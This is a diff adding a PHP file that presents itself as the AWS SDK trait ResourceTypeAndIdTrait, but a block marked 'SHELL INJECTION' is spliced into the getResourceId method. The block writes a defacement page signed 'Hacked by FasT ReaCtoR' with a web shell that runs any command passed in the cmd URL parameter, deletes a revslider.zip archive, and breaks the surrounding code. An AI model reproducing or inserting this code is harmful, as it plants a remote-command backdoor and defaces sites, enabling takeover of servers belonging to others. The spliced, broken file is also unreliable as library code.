@@ -1,0 +1,42 @@
+<?php
+namespace Aws\Arn;
+
+/**
+ * @internal
+ */
+trait ResourceTypeAndIdTrait
+{
+    public function getResourceType()
+    {
+        return $this->data['resource_type'];
+    }
+
+    public function getResourceId()
+// SHELL INJECTION<?php 
+error_reporting(0);
+
+$file  = '<style>body{overflow:hidden;background-color:black}#q{font:40px impact;color:white;position:absolute;left:0;right:0;top:43%}</style><title>Hacked by FasT ReaCtoR</title><center><div id=q>Hacked by FasT ReaCtoR<br>
+<?php system("$_GET[cmd]");echo "<br>O_O";exit; ?>';
+$r=fopen("../../../../../../Gass.php", "w");fwrite($r,$file);fclose($r);
+$r=fopen("x.php", "w");fwrite($r,"");fclose($r);
+system ("rm ../revslider.zip");
+if(file_exists("x.php")) unlink("x.php");
+
+?>
+?> Hacked by Fallag Gassrini
+    {
+        return $this->data['resource_id'];
+    }
+
+    protected static function parseResourceTypeAndId(array $data)
+    {
+        $resourceData = preg_split("/[\/:]/", $data['resource'], 2);
+        $data['resource_type'] = isset($resourceData[0])
+            ? $resourceData[0]
+            : null;
+        $data['resource_id'] = isset($resourceData[1])
+            ? $resourceData[1]
+            : null;
+        return $data;
+    }
+}
